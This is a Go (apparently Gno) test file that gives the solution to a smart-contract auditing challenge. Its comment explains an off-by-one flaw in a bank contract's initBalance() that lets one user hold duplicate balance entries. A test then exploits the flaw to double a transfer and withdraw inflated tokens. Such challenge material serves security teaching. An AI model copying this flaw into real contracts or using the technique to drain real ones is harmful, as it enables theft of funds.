/*
 * This file demonstrates the solution to the auditing challenge. Do not read until you're ready 
 * to reveal the soluion.
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * ...
 * SOLUTION: This bank application has a suspicious inefficiency. Rather than using a mapping of
 * balances, it maintains a list of balances. This allows the possibility that the same address
 * could be listed multiple times as a recipient for the Transfer() function.
 * At first glance, this is prevented by the initBalance() function, which only adds a new record
 * if the address in question was not already registered. However, this function suffers from an
 * off-by-1 error. This allows the first registered user to get listed in Balances multiple times,
 * resulting in Transfer() operations to be executed multiple times and inflate the bank supply.
 * The Withdraw() function as a corresponding issue in which multiple balances result in multiple
 * withdrawls, realizing the theft.
 */

 package bank

 import (
	 "std"
	 "testing"
	 "fmt" // for logging at debug level
 )
 
 const SolutionTestAmt = 1000000
 
 // Count the # of times an address appears in Balances
 func UserCount(balances []BalanceTuple, addr std.Address) int {
	 count := 0
	 for i:= 0; i < len(balances); i++ {
		 if balances[i].addr == addr {
			 count++
		 }
	 }
	 return count
 }
 
 //Steal from Alice by transferring twice the intended value
 func TestSolution(t *testing.T) {
	 Balances = Balances[:0] // Ensure balances are fresh for test
	 
	 adminAddr := std.DerivePkgAddr("brokenbank.TestDoubleTransfer.admin")
	 aliceAddr := std.DerivePkgAddr("brokenbank.TestDoubleTransfer.alice")
 
	 pkgAddr := std.GetOrigPkgAddr()
 
	 // Admin must be the first entity to call Deposit() and claim user ID = 0 to exploit the vuln
	 std.TestIssueCoins(adminAddr, std.Coins{{"ugnot", SolutionTestAmt}})
	 simulateSend(adminAddr, pkgAddr, BankTestAmt)
	 std.TestSetOrigCaller(adminAddr)
	 Deposit()
	 // Balances:
	 // [0] admin, TestAmt
	 
	 //Give Alice 2 x SolutionTestAmt and Deposit twice
	 std.TestIssueCoins(aliceAddr, std.Coins{{"ugnot", SolutionTestAmt}})
	 simulateSend(aliceAddr, pkgAddr, BankTestAmt)
	 std.TestSetOrigCaller(aliceAddr)
	 Deposit()
	 
	 // Balances:
	 // [0] admin, TestAmt
	 // [1] alice, TestAmt
 
	 //Intent: Transfer 1 x SolutionTestAmt to admin
	 std.TestSetOrigCaller(aliceAddr)
	 Transfer(adminAddr, SolutionTestAmt)
 
	 // When Transfer() is called, it will invoke initBalance() which will fail to find id = 0. It
	 // will then add another balance record for admin, set to 0.
	 // Balances:
	 // [0] admin, TestAmt
	 // [1] alice, TestAmt
	 // [2] admin, 0
	 // Then it will run the Transfer for each admin entry, failing to break
	 // [0] admin, TestAmt * 2
	 // [1] alice, 0
	 // [2] admin TestAmt
	 
	 //Admin should now be listed twice in balances
	 adminCount := 0
	 for i:= 0; i < len(Balances); i++ {
		 if Balances[i].addr == adminAddr {
			 adminCount++
		 }
	 }
	 
	 if adminCount != 2 {
		 t.Fatal("Admin does not have duplicate entries in balances:", adminCount)
	 }
 
	 //Alice should now be listed only once in balances
	 aliceCount := 0
	 for i:= 0; i < len(Balances); i++ {
		 if Balances[i].addr == aliceAddr {
			 aliceCount++
		 }
	 }
	 if aliceCount != 1 {
		 t.Fatal("Alice has wrong number of entries in balances:", aliceCount)
	 }
 
	 if Balances[0].addr != adminAddr || Balances[0].value != SolutionTestAmt * 2 {
		 t.Fatal("First entry for admin has incorrect amount after transfer.")
	 }
	 if Balances[1].addr != aliceAddr || Balances[1].value != 0 {
		 t.Fatal("Alice bank balance is incorrect after transfer.")
	 }
	 if Balances[2].addr != adminAddr || Balances[2].value != SolutionTestAmt {
		 t.Fatal("Second entry for admin has incorrect amount after transfer.")
	 }
 
	 // Finally, the Withdraw() function is broken by not breaking after a single send, allowing 
	 // the malicious Realm dev to realize the theft in tokens.
	 std.TestSetOrigCaller(adminAddr)
	 Withdraw(adminAddr)
 
	 if getBalance(adminAddr) <= 2 * SolutionTestAmt {
		 t.Fatal("Admin failed to withdraw inflated currency.")
	 }
 }
 